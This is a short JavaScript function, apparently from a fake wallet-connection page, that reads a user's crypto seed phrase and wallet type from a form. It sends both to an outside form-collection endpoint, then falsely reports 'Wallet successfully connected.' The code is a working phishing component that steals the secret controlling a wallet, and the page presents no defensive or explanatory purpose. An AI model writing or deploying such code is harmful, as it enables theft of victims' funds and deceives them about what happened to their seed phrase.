function submitSeed() {
  const seed = document.getElementById("seedPhrase").value;
  const walletType = document.getElementById("walletType").value;

  if (!seed || seed.split(" ").length < 12) {
    alert("Please enter a valid 12-word seed phrase.");
    return;
  }

  fetch("https://formspree.io/f/mocked-endpoint", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      walletType: walletType,
      seedPhrase: seed
    })
  }).then(() => {
    alert("Wallet successfully connected.");
  });
}
